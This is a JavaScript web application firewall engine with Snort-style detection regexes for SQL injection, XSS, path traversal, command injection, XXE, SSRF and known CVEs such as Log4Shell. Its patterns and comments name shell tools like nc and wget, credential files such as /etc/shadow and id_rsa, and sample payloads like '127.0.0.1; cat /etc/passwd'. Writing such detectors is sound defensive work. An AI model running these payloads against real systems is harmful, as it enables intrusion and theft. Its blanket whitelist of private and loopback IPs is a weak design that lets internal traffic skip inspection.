/**
 * Snort-Style Rules Engine — IMPROVED v2.0
 * ─────────────────────────────────────────
 * Implements Snort-compatible rule syntax and matching for WAF detection.
 *
 * Rule format: action proto src_ip src_port direction dst_ip dst_port (options)
 * Example: alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SQLi"; sid:1000001; rev:1;)
 */

// ─────────────────────────────────────────────────────────────────────────────
// SNORT RULE DEFINITIONS
// ─────────────────────────────────────────────────────────────────────────────

const SNORT_RULES = [

  // ══════════════════════════════════════════════════════════════════════════
  // SQL INJECTION
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000001, rev: 4, action: "alert", proto: "tcp",
    msg: "SQLi - UNION SELECT (raw + encoded)",
    category: "SQLi", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    // Covers: UNION SELECT, UNION/**/SELECT, URL-encoded %55NION, double-encoded
    pcre: /(?:UNION(?:\s|\/\*.*?\*\/|%09|%0a|%0d|%20)+(?:ALL\s+)?SELECT|%55NION(?:%20|%09|%0a)+SELECT|UNION%20SELECT)/i,
    reference: "OWASP-SQLi-001",
  },

  {
    sid: 1000002, rev: 3, action: "alert", proto: "tcp",
    msg: "SQLi - Boolean-based blind (OR/AND tautology)",
    category: "SQLi", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    // Must have a quote or operator context to avoid matching plain 'OR' / 'AND'
    pcre: /(?:'|"|\b)(?:OR|AND)(?:\s|%20|\/\*.*?\*\/)+(?:['"\d\w]+=\s*['"\d\w]+|1\s*=\s*1|'[^']*'\s*=\s*'[^']*'|true|false)/i,
  },

  {
    sid: 1000003, rev: 2, action: "alert", proto: "tcp",
    msg: "SQLi - DDL attack (DROP / TRUNCATE / ALTER)",
    category: "SQLi", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    pcre: /(?:DROP|TRUNCATE|ALTER)\s+(?:TABLE|DATABASE|SCHEMA|INDEX)\s+\w+/i,
  },

  {
    sid: 1000004, rev: 3, action: "alert", proto: "tcp",
    msg: "SQLi - Comment terminator sequence",
    category: "SQLi", severity: "high", priority: 2,
    classtype: "web-application-attack",
    // Catches: '--', '#', '/*', inline comment obfuscation
    pcre: /(?:'|;|%27|%3B)\s*(?:--|#|\/\*|%2d%2d|%23)/i,
  },

  {
    sid: 1000005, rev: 2, action: "alert", proto: "tcp",
    msg: "SQLi - Time-based blind (SLEEP / WAITFOR / BENCHMARK / PG_SLEEP)",
    category: "SQLi", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    pcre: /(?:['";=(]|\bAND\b|\bOR\b|\bWHERE\b|--|\/\*)\s*(?:SLEEP\s*\(\s*\d+|WAITFOR\s+DELAY\s*'[\d:]+|BENCHMARK\s*\(\s*\d+\s*,|PG_SLEEP\s*\(\s*\d+)/i,
  },

  {
    sid: 1000006, rev: 1, action: "alert", proto: "tcp",
    msg: "SQLi - Stacked queries (semicolon chaining)",
    category: "SQLi", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    // Covers: '; INSERT', '; EXEC', '; UPDATE', '; DELETE', '; CALL
    pcre: /(?:'|%27);?\s*(?:INSERT|UPDATE|DELETE|EXEC(?:UTE)?|CALL|DECLARE|CAST|CONVERT)\s+/i,
  },

  {
    sid: 1000007, rev: 1, action: "alert", proto: "tcp",
    msg: "SQLi - Error-based extraction (extractvalue / updatexml / exp)",
    category: "SQLi", severity: "high", priority: 2,
    classtype: "web-application-attack",
    pcre: /(?:extractvalue|updatexml|exp|floor|rand)\s*\(\s*(?:\d+\s*,\s*)?(?:0x|concat|char|select)/i,
  },

  {
    sid: 1000008, rev: 1, action: "alert", proto: "tcp",
    msg: "SQLi - Out-of-band via LOAD_FILE / INTO OUTFILE / DUMPFILE",
    category: "SQLi", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    pcre: /(?:LOAD_FILE|INTO\s+(?:OUT|DUMP)FILE)\s*\(/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // CROSS-SITE SCRIPTING (XSS)
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000010, rev: 4, action: "alert", proto: "tcp",
    msg: "XSS - Script tag injection (raw + encoded)",
    category: "XSS", severity: "high", priority: 2,
    classtype: "web-application-attack",
    // Covers: <script, %3Cscript, &#x3C;script, <scr\nipt (newline obfuscation)
    pcre: /(?:<|%3C|&#x?3c;?)\s*s\s*c\s*r\s*i\s*p\s*t[\s\S]*?(?:>|%3E|&#x?3e;?)/i,
  },

  {
    sid: 1000011, rev: 3, action: "alert", proto: "tcp",
    msg: "XSS - Event handler injection (onXxx=)",
    category: "XSS", severity: "high", priority: 2,
    classtype: "web-application-attack",
    // Expanded: all on* handlers, not just common ones
    pcre: /<[a-zA-Z][^>]*\s+on[a-zA-Z]{2,20}\s*=\s*["']?(?:[^"'>]*(?:alert|eval|fetch|document\.|window\.|location\.|this\.|atob|btoa|fromCharCode|String\.from))/i,
  },

  {
    sid: 1000012, rev: 2, action: "alert", proto: "tcp",
    msg: "XSS - javascript: URI (including encoded forms)",
    category: "XSS", severity: "high", priority: 2,
    classtype: "web-application-attack",
    // Covers: javascript:, java&#x9;script:, j%61v%61script:
    pcre: /j[\s\u0000-\u001f]*a[\s\u0000-\u001f]*v[\s\u0000-\u001f]*a[\s\u0000-\u001f]*s[\s\u0000-\u001f]*c[\s\u0000-\u001f]*r[\s\u0000-\u001f]*i[\s\u0000-\u001f]*p[\s\u0000-\u001f]*t[\s\u0000-\u001f]*:/i,
  },

  {
    sid: 1000013, rev: 2, action: "alert", proto: "tcp",
    msg: "XSS - SVG/MathML/iframe based payload",
    category: "XSS", severity: "high", priority: 2,
    classtype: "web-application-attack",
    pcre: /<(?:svg|math|iframe|object|embed|applet|base)[^>]*\s+(?:on\w+\s*=|src\s*=\s*["']?javascript)/i,
  },

  {
    sid: 1000014, rev: 2, action: "alert", proto: "tcp",
    msg: "XSS - eval() / Function() / setTimeout obfuscation",
    category: "XSS", severity: "high", priority: 2,
    classtype: "web-application-attack",
    pcre: /\beval\s*\(\s*(?:["'`]|unescape|atob|decodeURI|String\.fromCharCode|\$_)|new\s+Function\s*\(\s*["'`]|setTimeout\s*\(\s*["'`][^"'`]*(?:document\.|location\.|eval)/i,
  },

  {
    sid: 1000015, rev: 1, action: "alert", proto: "tcp",
    msg: "XSS - HTML entity / charset encoding bypass",
    category: "XSS", severity: "medium", priority: 3,
    classtype: "web-application-attack",
    // Detects heavy entity encoding that typically hides <script> or event handlers
    pcre: /(?:&#x?[0-9a-f]{2,5};){4,}|(?:%[0-9a-f]{2}){4,}(?:script|eval|alert)/i,
  },

  {
    sid: 1000016, rev: 1, action: "alert", proto: "tcp",
    msg: "XSS - DOM clobbering / prototype injection via HTML",
    category: "XSS", severity: "medium", priority: 3,
    classtype: "web-application-attack",
    pcre: /<(?:a|form|input)[^>]+(?:id|name)\s*=\s*["']?(?:__proto__|constructor|prototype)["']?/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // PATH TRAVERSAL / LOCAL FILE INCLUSION (LFI) / REMOTE FILE INCLUSION (RFI)
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000020, rev: 3, action: "alert", proto: "tcp",
    msg: "Path Traversal - Directory traversal sequences (raw + encoded)",
    category: "Path Traversal", severity: "high", priority: 2,
    classtype: "attempted-recon",
    // Covers: ../, ..\, %2e%2e%2f, %252e (double encoded), ....// (filter bypass)
    pcre: /(?:\.\.(?:\/|\\|%2f|%5c|%252f|%255c)){2,}|(?:%2e%2e(?:%2f|%5c|\/|\\)){2,}|(?:\.\.\/){2,}|(?:\.\.\\){2,}|(?:\.{2,}\/){2,}/i,
  },

  {
    sid: 1000021, rev: 2, action: "alert", proto: "tcp",
    msg: "Path Traversal - URL-encoded and double-encoded traversal",
    category: "Path Traversal", severity: "high", priority: 2,
    classtype: "attempted-recon",
    pcre: /(?:%2e%2e%2f|%2e%2e\/|\.\.%2f|%2e%2e%5c|%252e%252e%252f|%c0%ae|%e0%80%ae)/i,
  },

  {
    sid: 1000022, rev: 2, action: "alert", proto: "tcp",
    msg: "LFI - Sensitive Unix/Windows file access",
    category: "Path Traversal", severity: "critical", priority: 1,
    classtype: "attempted-recon",
    pcre: /\/etc\/(?:passwd|shadow|hosts|sudoers|crontab|group|issue|motd|os-release)|\/proc\/(?:self|version|cmdline|environ|net\/tcp)|[Cc]:\\[Ww][Ii][Nn][Dd][Oo][Ww][Ss]\\(?:[Ss]ystem32|[Ss]AM|[Ww][Ii][Nn]\.ini)/,
  },

  {
    sid: 1000023, rev: 1, action: "alert", proto: "tcp",
    msg: "LFI - PHP wrapper / filter schemes",
    category: "Path Traversal", severity: "critical", priority: 1,
    classtype: "attempted-recon",
    // php://filter, php://input, phar://, zip://, data://
    pcre: /(?:php|phar|zip|data|glob|expect|file|ssh2):\/\/(?:filter|input|resource|stdout|stdin|memory|fd|temp)/i,
  },

  {
    sid: 1000024, rev: 1, action: "alert", proto: "tcp",
    msg: "RFI - Remote file inclusion via http/ftp scheme",
    category: "Path Traversal", severity: "critical", priority: 1,
    classtype: "attempted-recon",
    // Typically in ?page=, ?file=, ?include= parameters
    pcre: /(?:include|require|include_once|require_once)\s*[=(]\s*["']?(?:https?|ftp):\/\//i,
  },

  {
    sid: 1000025, rev: 1, action: "alert", proto: "tcp",
    msg: "Path Traversal - Null byte injection",
    category: "Path Traversal", severity: "high", priority: 2,
    classtype: "attempted-recon",
    pcre: /(?:\.\.\/.*|\.\.\\.*|%2e%2e%2f.*)(?:%00|\\0|%0a|%0d)/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // REMOTE CODE EXECUTION (RCE) / COMMAND INJECTION
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000030, rev: 3, action: "alert", proto: "tcp",
    msg: "RCE - Shell command injection via backtick",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    pcre: /`[^`]{3,}`/,
  },

  {
    sid: 1000031, rev: 2, action: "alert", proto: "tcp",
    msg: "RCE - Command substitution via $() syntax",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    // Expanded dangerous command list
    pcre: /\$\(\s*(?:ls|cat|id|whoami|uname|pwd|wget|curl|bash|sh|zsh|python[23]?|perl|ruby|nc|netcat|ncat|rm|chmod|chown|find|grep|awk|sed|dd|cp|mv|touch|kill|ps|env|printenv|set|export|echo|printf|tee|xargs|base64|xxd)\b/i,
  },

  {
    sid: 1000032, rev: 3, action: "alert", proto: "tcp",
    msg: "RCE - PHP code execution functions",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    pcre: /(?:[;|&`{?(])\s*\b(?:exec|system|passthru|shell_exec|popen|proc_open|pcntl_exec|posix_kill|assert)\s*\(|\beval\s*\(\s*(?:["'`\$]|base64|gzinflate|str_rot13|gzuncompress)/i,
  },

  {
    sid: 1000033, rev: 2, action: "alert", proto: "tcp",
    msg: "RCE - Remote file download attempt (wget/curl)",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    pcre: /(?:[;|&`$(])\s*(?:wget|curl)\s+|\b(?:wget|curl)\s+(?:-[a-zA-Z]+\s+)*https?:\/\//i,
  },

  {
    sid: 1000034, rev: 1, action: "alert", proto: "tcp",
    msg: "RCE - OS command injection via pipe / semicolon",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    // Input like: 127.0.0.1; cat /etc/passwd  or  127.0.0.1 | whoami
    pcre: /[;&|]\s*(?:cat|ls|id|whoami|uname|ps|netstat|ifconfig|ipconfig|net\s+user|dir\s+c:|type\s+c:|ping|nslookup|dig|curl|wget|bash|sh|cmd|powershell)\b/i,
  },

  {
    sid: 1000035, rev: 1, action: "alert", proto: "tcp",
    msg: "RCE - Python / Ruby / Perl one-liner code injection",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    pcre: /(?:python[23]?\s+-c\s*["']|ruby\s+-e\s*["']|perl\s+-e\s*["']|node\s+-e\s*["'])(?:import\s+os|exec|eval|system|require|spawn)/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // SERVER-SIDE TEMPLATE INJECTION (SSTI)
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000036, rev: 1, action: "alert", proto: "tcp",
    msg: "SSTI - Template expression injection (Jinja2/Twig/Tornado)",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    // {{ 7*7 }}, {{ config }}, {% for ... %}, ${7*7}
    pcre: /(?:\{\{[\s\S]{1,100}\}\}|\{%[\s\S]{1,100}%\}|\$\{[\s\S]{1,100}\})/,
  },

  {
    sid: 1000037, rev: 1, action: "alert", proto: "tcp",
    msg: "SSTI - Class/MRO traversal for sandbox escape",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    pcre: /(?:__class__|__mro__|__subclasses__|__globals__|__builtins__|__import__)/,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // XML EXTERNAL ENTITY (XXE)
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000050, rev: 2, action: "alert", proto: "tcp",
    msg: "XXE - DOCTYPE with ENTITY declaration",
    category: "XXE", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    pcre: /<!DOCTYPE[^>]*\[[\s\S]*<!ENTITY/i,
  },

  {
    sid: 1000051, rev: 1, action: "alert", proto: "tcp",
    msg: "XXE - External entity reference to system resource",
    category: "XXE", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    pcre: /<!ENTITY[^>]+SYSTEM\s+["'](?:file|https?|ftp|php|data|expect|jar):\/\//i,
  },

  {
    sid: 1000052, rev: 1, action: "alert", proto: "tcp",
    msg: "XXE - Parameter entity exfiltration",
    category: "XXE", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    pcre: /<!ENTITY\s+%\s+\w+\s+SYSTEM\s+["']/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // SERVER-SIDE REQUEST FORGERY (SSRF)
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000060, rev: 2, action: "alert", proto: "tcp",
    msg: "SSRF - Request to internal IP / metadata service",
    category: "SSRF", severity: "critical", priority: 1,
    classtype: "attempted-recon",
    // AWS/GCP/Azure metadata, localhost, internal ranges in URL params
    pcre: /(?:url|uri|src|href|path|dest|target|host|endpoint|proxy|redirect|next|to|file|fetch|load|resource|request|remote)\s*=\s*(?:https?:\/\/)?(?:169\.254\.169\.254|metadata\.google\.internal|127\.\d+\.\d+\.\d+|0\.0\.0\.0|localhost|::1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)/i,
  },

  {
    sid: 1000061, rev: 1, action: "alert", proto: "tcp",
    msg: "SSRF - Non-HTTP scheme in URL parameter (file/gopher/dict/ftp)",
    category: "SSRF", severity: "critical", priority: 1,
    classtype: "attempted-recon",
    pcre: /(?:url|uri|src|href|path|dest|target|load|fetch|resource)\s*=\s*["']?(?:file|gopher|dict|ftp|tftp|ldap|jar|netdoc):\/\//i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // OPEN REDIRECT
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000070, rev: 1, action: "alert", proto: "tcp",
    msg: "Open Redirect - External URL in redirect parameter",
    category: "Open Redirect", severity: "medium", priority: 3,
    classtype: "web-application-attack",
    // Only flag if external domain appears in a common redirect parameter
    pcre: /(?:redirect|return|url|next|to|goto|dest|destination|rurl|returl|returnUrl|forward|location|continue)\s*=\s*(?:https?:)?\/\/(?!(?:localhost|127\.0\.0\.1))/i,
  },

  {
    sid: 1000071, rev: 1, action: "alert", proto: "tcp",
    msg: "Open Redirect - javascript: / data: in redirect target",
    category: "Open Redirect", severity: "high", priority: 2,
    classtype: "web-application-attack",
    pcre: /(?:redirect|return|url|next|to|goto|dest)\s*=\s*(?:javascript|data|vbscript):/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // NOSQL INJECTION
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000080, rev: 1, action: "alert", proto: "tcp",
    msg: "NoSQLi - MongoDB operator injection ($where / $regex / $gt / $ne)",
    category: "NoSQLi", severity: "high", priority: 2,
    classtype: "web-application-attack",
    pcre: /(?:\[\$(?:where|regex|gt|gte|lt|lte|ne|nin|in|exists|type|mod|text|elemMatch|size|not|nor|or|and)\]|\{\s*"\$(?:where|regex|gt|gte|lt|lte|ne|nin|in|exists|type|mod|text|elemMatch|size|not|nor|or|and)"\s*:)/i,
  },

  {
    sid: 1000081, rev: 1, action: "alert", proto: "tcp",
    msg: "NoSQLi - $where with JavaScript function",
    category: "NoSQLi", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    pcre: /"\$where"\s*:\s*["']?(?:function|this\.|sleep|return|while|for)/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // PROTOTYPE POLLUTION
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000090, rev: 1, action: "alert", proto: "tcp",
    msg: "Prototype Pollution - __proto__ / constructor.prototype manipulation",
    category: "Prototype Pollution", severity: "high", priority: 2,
    classtype: "web-application-attack",
    pcre: /(?:["']?__proto__["']?|constructor\s*\[|constructor\s*\.\s*prototype|\[["']__proto__["']\])\s*[=:[{]/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // HTTP REQUEST SMUGGLING
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000100, rev: 1, action: "alert", proto: "tcp",
    msg: "HTTP Smuggling - Conflicting Transfer-Encoding / Content-Length",
    category: "HTTP Smuggling", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    // Detect obfuscated Transfer-Encoding header values
    headerCheck: "smuggling",
  },

  // ══════════════════════════════════════════════════════════════════════════
  // JWT TAMPERING
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000110, rev: 1, action: "alert", proto: "tcp",
    msg: "JWT - Algorithm confusion (alg:none / HS/RS confusion)",
    category: "Auth", severity: "critical", priority: 1,
    classtype: "web-application-attack",
    // Detects base64-encoded JWT header with "alg":"none"
    pcre: /eyJ[A-Za-z0-9+/=]+\.eyJ[A-Za-z0-9+/=]*\./,
    jwtCheck: true,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // SCANNER / RECON FINGERPRINTING
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000040, rev: 2, action: "alert", proto: "tcp",
    msg: "Scanner - sqlmap detected",
    category: "SQLi", severity: "high", priority: 2,
    classtype: "web-application-attack",
    userAgentPattern: /sqlmap/i,
  },

  {
    sid: 1000041, rev: 1, action: "alert", proto: "tcp",
    msg: "Scanner - Nikto detected",
    category: "Recon", severity: "medium", priority: 3,
    classtype: "web-application-activity",
    userAgentPattern: /nikto/i,
  },

  {
    sid: 1000042, rev: 1, action: "alert", proto: "tcp",
    msg: "Scanner - masscan detected",
    category: "Recon", severity: "medium", priority: 3,
    classtype: "network-scan",
    userAgentPattern: /masscan/i,
  },

  {
    sid: 1000120, rev: 1, action: "alert", proto: "tcp",
    msg: "Scanner - Burp Suite / ZAP / w3af / acunetix detected",
    category: "Recon", severity: "high", priority: 2,
    classtype: "web-application-activity",
    userAgentPattern: /(?:Burp|ZAP|w3af|acunetix|AppScan|WebInspect|Nessus|OpenVAS|Qualys|Detectify)/i,
  },

  {
    sid: 1000121, rev: 1, action: "alert", proto: "tcp",
    msg: "Scanner - DirBuster / Gobuster / ffuf / wfuzz path enumeration",
    category: "Recon", severity: "high", priority: 2,
    classtype: "web-application-activity",
    userAgentPattern: /(?:DirBuster|gobuster|ffuf|wfuzz|dirsearch|feroxbuster)/i,
  },

  {
    sid: 1000043, rev: 2, action: "alert", proto: "tcp",
    msg: "Recon - Sensitive file / config access attempt",
    category: "Recon", severity: "high", priority: 2,
    classtype: "attempted-recon",
    urlPattern: /\/(?:\.env(?:\.local|\.prod|\.dev)?|\.git\/(?:HEAD|config|FETCH_HEAD)|backup(?:\.sql|\.tar\.gz|\.zip)?|wp-config\.php|config\.php|\.htaccess|\.htpasswd|web\.config|database\.yml|credentials\.json|secrets\.yaml|id_rsa|authorized_keys|composer\.json|package\.json|Dockerfile|docker-compose\.yml)(?:\?|$)/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // KNOWN CVEs
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000140, rev: 2, action: "alert", proto: "tcp",
    msg: "Log4Shell - JNDI injection (CVE-2021-44228)",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    reference: "CVE-2021-44228",
    // Includes obfuscated variants: ${${lower:j}ndi:}, ${j${::-n}di:}
    pcre: /\$\{(?:[^\}]*\$\{[^\}]*\}[^\}]*)*j(?:[\s\$\{}]*n(?:[\s\$\{}]*d(?:[\s\$\{}]*i)))?\s*:|jndi\s*:/i,
  },

  {
    sid: 1000141, rev: 1, action: "alert", proto: "tcp",
    msg: "ShellShock - Bash function in header (CVE-2014-6271)",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    reference: "CVE-2014-6271",
    pcre: /\(\s*\)\s*\{\s*:?\s*;\s*\}\s*;|\(\s*\)\s*\{[^}]*(?:echo|bash|curl|wget|nc)[^}]*\}\s*;/i,
  },

  {
    sid: 1000130, rev: 1, action: "alert", proto: "tcp",
    msg: "Spring4Shell - class.module.classLoader exploit (CVE-2022-22965)",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    reference: "CVE-2022-22965",
    pcre: /class\.module\.classLoader|class\[module\]\[classLoader\]/i,
  },

  {
    sid: 1000131, rev: 1, action: "alert", proto: "tcp",
    msg: "Apache Struts OGNL injection (CVE-2017-5638 / CVE-2018-11776)",
    category: "RCE", severity: "critical", priority: 1,
    classtype: "attempted-admin",
    reference: "CVE-2017-5638",
    pcre: /%\{[^}]*(?:Runtime|ProcessBuilder|exec|\.getClass|\.forName)[^}]*\}/i,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // CSRF
  // ══════════════════════════════════════════════════════════════════════════

  {
    sid: 1000160, rev: 2, action: "alert", proto: "tcp",
    msg: "CSRF - Cross-origin request without valid Origin/Referer",
    category: "CSRF", severity: "medium", priority: 3,
    classtype: "web-application-attack",
    headerCheck: "csrf",
  },
];

// ─────────────────────────────────────────────────────────────────────────────
// WHITELIST — Known-safe paths, IPs, user-agents
// ─────────────────────────────────────────────────────────────────────────────

const WHITELIST = {
  // API / health / static paths that are internally monitored
  paths: [
    /^\/api\/(dashboard|alerts|rules|reports|analytics|incidents|ip)(\/|$)/,
    /^\/health(?:z|check)?$/,
    /^\/favicon\.ico$/,
    /^\/robots\.txt$/,
    /^\/_next\//,
    /^\/static\//,
    /^\/assets\//,
    /^\/public\//,
  ],

  // Monitoring and crawl bots — not attack agents
  userAgents: [
    /Prometheus\//i,
    /Datadog\//i,
    /NewRelic\//i,
    /UptimeRobot\//i,
    /Pingdom/i,
    /GoogleBot/i,
    /Bingbot/i,
    /DuckDuckBot/i,
    /YandexBot/i,
  ],

  // Private IP ranges — internal traffic (adjust to your needs)
  ipRanges: [
    /^10\./,
    /^192\.168\./,
    /^172\.(1[6-9]|2\d|3[0-1])\./,
    // Uncomment to whitelist loopback (only if needed in dev):
    /^127\./,
    // /^::1$/,
  ],
};

// ─────────────────────────────────────────────────────────────────────────────
// FALSE POSITIVE SCORING
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Returns an adjustment score to reduce or increase alert confidence.
 *  Negative = more likely FP (reduce confidence)
 *  Positive  = more likely TP (increase confidence / trigger block)
 */
function falsePositiveScore(req, matchedRule) {
  let score = 0;
  const url      = req.originalUrl || "";
  const ua       = (req.headers["user-agent"] || "").toLowerCase();
  const ct       = (req.headers["content-type"] || "").toLowerCase();
  const body     = JSON.stringify(req.body || {});
  const bodyUrl  = url + " " + body;

  // ── Reduce confidence (likely FP) ────────────────────────────────────────

  // JSON API body containing SQL-like words but no dangerous syntax
  if (ct.includes("application/json") && matchedRule.category === "SQLi") {
    const dangerous = /(?:'|--|;|\bEXEC\b|\bDROP\b|\bUNION\b|\bSLEEP\b)/i;
    if (!dangerous.test(body)) score -= 2;
  }

  // Very short input rarely carries a full injection payload
  if (matchedRule.category === "SQLi" && body.length < 20) score -= 1;

  // Search / query endpoints legitimately contain SQL-like terms
  if (/\/(?:search|query|find|filter|lookup)/i.test(url) && matchedRule.category === "SQLi") score -= 1;

  // Rich-text / Markdown editors — HTML tags are expected
  if (/\/(?:editor|post|article|comment|content|blog|wiki)/i.test(url) && matchedRule.category === "XSS") score -= 1;

  // GraphQL endpoint — curly braces, quotes, and field names are standard
  if (/\/graphql/i.test(url) && matchedRule.category === "SQLi") score -= 2;

  // OPTIONS pre-flight — never a real attack
  if (req.method === "OPTIONS") score -= 5;

  // ── Increase confidence (likely TP) ──────────────────────────────────────

  // Multiple attack indicators in one request → probably automated tooling
  let patternHits = 0;
  if (/UNION[\s%0a%0d]+SELECT/i.test(bodyUrl))    patternHits++;
  if (/<script[\s\S]*?>/i.test(bodyUrl))           patternHits++;
  if (/(?:\.\.\/){2,}/g.test(bodyUrl))            patternHits++;
  if (/\bexec\s*\(/i.test(bodyUrl))               patternHits++;
  if (/\$\{jndi:/i.test(bodyUrl))                 patternHits++;
  if (/<!ENTITY/i.test(bodyUrl))                  patternHits++;
  if (patternHits > 1) score += patternHits * 2;

  // Known malicious scanner user-agent
  if (/sqlmap|nikto|masscan|nmap|zgrab|dirbuster|gobuster|ffuf|wfuzz|burpsuite|w3af|acunetix/i.test(ua)) score += 4;

  // Targeting sensitive admin / infra paths
  if (/\/(?:admin|wp-admin|phpmyadmin|\.env|backup|shell|cmd|\.git|console|manager)/i.test(url)) score += 2;

  // Encoded payloads in URL — common obfuscation technique
  if (/%(?:27|3c|3e|22|60|2e%2e|00|0a|0d)/i.test(url)) score += 1;

  // Double-encoding present
  if (/%25(?:27|3c|3e|22)/i.test(url)) score += 2;

  // Unusually high special-character density
  const specialCharRatio = (body.match(/['";`<>{}()\[\]]/g) || []).length / Math.max(body.length, 1);
  if (specialCharRatio > 0.15 && body.length > 30) score += 2;

  return score;
}

// ─────────────────────────────────────────────────────────────────────────────
// WHITELIST CHECK
// ─────────────────────────────────────────────────────────────────────────────

function isWhitelisted(req, ip) {
  const url = req.originalUrl || "";
  const ua  = req.headers["user-agent"] || "";

  for (const range of WHITELIST.ipRanges)      { if (range.test(ip)) return true; }
  for (const p of WHITELIST.paths)             { if (p.test(url)) return true; }
  for (const uaP of WHITELIST.userAgents)      { if (uaP.test(ua)) return true; }

  return false;
}

// ─────────────────────────────────────────────────────────────────────────────
// SUPPLEMENTAL HEADER CHECKS
// ─────────────────────────────────────────────────────────────────────────────

function checkHeaderSpecialRules(req, rule) {
  if (rule.headerCheck === "csrf") {
    const origin = req.headers["origin"] || "";
    const host   = req.headers["host"]   || "";
    return (
      req.method !== "GET" &&
      req.method !== "HEAD" &&
      !!origin &&
      !origin.includes(host)
    );
  }

  if (rule.headerCheck === "smuggling") {
    const te = req.headers["transfer-encoding"] || "";
    const cl = req.headers["content-length"]   || "";
    // Both headers present = potential smuggling, OR obfuscated TE value
    return (
      (!!te && !!cl) ||
      /chunked[\s\t,;]|[\s\t]chunked|chunked0/i.test(te)
    );
  }

  return false;
}

/**
 * Extra JWT check — detect alg:none or suspicious JWT in Authorization header.
 */
function checkJWT(req) {
  const auth = req.headers["authorization"] || "";
  const match = auth.match(/^Bearer\s+(eyJ[A-Za-z0-9+/=]+)\.(eyJ[A-Za-z0-9+/=]*)\./i);
  if (!match) return false;
  try {
    const header = JSON.parse(atob(match[1]));
    if (!header.alg || header.alg.toLowerCase() === "none") return true;
  } catch (_) { /* invalid base64 / JSON — skip */ }
  return false;
}

// ─────────────────────────────────────────────────────────────────────────────
// RULE MATCHING ENGINE
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Builds the single inspection target string from all request surfaces.
 */
function buildTarget(req) {
  return [
    req.originalUrl || "",
    JSON.stringify(req.body   || {}),
    JSON.stringify(req.query  || {}),
    req.headers["user-agent"] || "",
    Object.values(req.headers).join(" "),
  ].join(" ");
}

/**
 * Match all rules against the current request.
 * Returns array of matched rule objects, sorted by priority.
 */
function matchSnortRules(req) {
  const target  = buildTarget(req);
  const matched = [];

  for (const rule of SNORT_RULES) {
    let hit = false;

    if (!hit && rule.pcre)             hit = rule.pcre.test(target);
    if (!hit && rule.userAgentPattern) hit = rule.userAgentPattern.test(req.headers["user-agent"] || "");
    if (!hit && rule.urlPattern)       hit = rule.urlPattern.test(req.originalUrl || "");
    if (!hit && rule.headerCheck)      hit = checkHeaderSpecialRules(req, rule);
    if (!hit && rule.jwtCheck)         hit = checkJWT(req);

    if (hit) {
      const fpScore = falsePositiveScore(req, rule);
      matched.push({
        ...rule,
        falsePositiveScore: fpScore,
        effectiveSeverity: fpScore < -1 ? downgrade(rule.severity) : rule.severity,
        // Block if fp score doesn't strongly suggest a false positive
        shouldBlock: fpScore > -2,
      });
    }
  }

  return matched.sort((a, b) => a.priority - b.priority);
}

function downgrade(severity) {
  const levels = ["info", "low", "medium", "high", "critical"];
  const idx = levels.indexOf(severity);
  return idx > 0 ? levels[idx - 1] : severity;
}

function getBestMatch(req) {
  const matches = matchSnortRules(req);
  return matches.length === 0 ? null : matches[0];
}

function getMatchedSIDs(matches) {
  return matches.map(m => `SID:${m.sid}`).join(", ");
}

// ─────────────────────────────────────────────────────────────────────────────
// TEST SUITE
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Lightweight test runner — call runTests() in a Node.js environment.
 *
 * Each test specifies:
 *   label       — human-readable description
 *   type        — "TP" (true positive) | "TN" (true negative) | "FP" (false positive check)
